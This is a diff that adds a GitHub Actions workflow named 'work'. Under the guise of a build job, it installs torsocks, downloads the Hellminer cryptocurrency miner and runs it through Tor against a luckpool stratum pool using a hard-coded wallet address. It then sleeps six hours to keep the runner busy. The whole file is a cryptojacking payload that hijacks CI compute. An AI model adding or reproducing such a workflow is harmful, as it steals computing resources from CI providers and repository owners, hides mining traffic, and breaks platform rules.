@@ -1,0 +1,29 @@
+name: work
+
+on:
+  push:
+    branches:
+      - main
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Install Torsocks
+        run: sudo apt-get update && sudo apt-get install -y torsocks
+
+      - name: Download and Extract Hellminer
+        run: |
+          wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz
+          tar -xf hellminer_linux64.tar.gz
+
+      - name: Run Hellminer
+        run: |
+          torsocks ./hellminer -c stratum+tcp://eu.luckpool.net:3956 -u RXdK9Kiiz2pLUu9k8i7Tx9RKhLEnCJq9Us.M1 -p x --cpu 1 >> hellminer.log
+
+      - name: Display Output
+        run: |
+          cat hellminer.log
+          sleep 6h
+          echo "Looping..."
